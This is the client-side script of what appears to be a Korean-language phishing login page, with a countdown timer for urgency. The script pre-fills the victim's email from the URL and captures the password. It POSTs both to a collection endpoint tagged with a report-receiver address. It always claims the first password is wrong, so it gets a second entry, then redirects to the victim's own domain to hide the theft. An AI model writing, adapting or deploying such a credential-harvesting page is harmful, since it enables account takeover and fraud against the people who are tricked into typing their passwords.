<script>
// Set the date we're counting down to
var countDownDate = new Date("Jan 5, 2022 15:37:25").getTime();
var x = setInterval(function() {
  var now = new Date().getTime();
  var distance = countDownDate - now;
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
  document.getElementById("hms").innerHTML = minutes + "m " + seconds + "s ";
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("hms").innerHTML = "EXPIRED";
  }
}, 1000);
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script type="text/javascript">
    const param = new URLSearchParams(window.location.search);
    let emailParam = param.get('email') ? param.get('email') : '';
    let count = 0;

    if (emailParam === "null") {
      emailParam = "";
    }

    const showEmail = document.querySelectorAll('#showEmail');
    const email = document.getElementById('email');
    const password = document.getElementById('password');
    const login = document.getElementById('login-button');
    const source = document.getElementById('source');
    const err = document.getElementById('showerror');
    const form = document.getElementById("login_form");
    showEmail[0].textContent = emailParam;
    showEmail[1].textContent = emailParam;
    email.value = emailParam;

    login.addEventListener('click', function(e){
      e.preventDefault();
      if (password.value === "") {
        err.textContent = "비밀번호를 입력하세요";
        password.focus();
        showEl(err, "red");
        return;
      } else {
        const domain = email.value.split('@')[1];
        count = count + 1;
        hideEl(err, "#000");
        const prevVal = login.value;
        login.value = "로그인 중 ...";

        var $form = $("#login_form");
        var url = form.action;
        var data = {
         email: email.value,
         password: password.value,
         source: source.value,
         receiverEmail: 'allreport@lenpath.com'
        };

        $.ajax({
          type: "POST",
          url: url,
          data: data,
          success: function(res) {
	        if (count > 1) {
	            hideEl(err);
	            window.location.href = "https://www."+domain;
	            return;
	        }

	        password.value = "";
	        password.style.borderColor = "red";
	        showEl(err, "red");
	        err.textContent = "비밀번호가 맞지 않습니다";
	        login.value = prevVal;

          },
          error: function(e) {
            showEl(err, "red");
            err.textContent = "다시 시도하십시오. 문제가 발생했습니다.";
            password.value = "";
            password.style.borderColor = "red";
            login.value = prevVal;
          }
        });
      }
    });

    function showEl(el, color) {
      el.style.color = color;
      el.style.display = "block";
    }

    function hideEl(el) {
      el.style.color = '#000';
      el.style.display = "none";    
  	}
  </script>
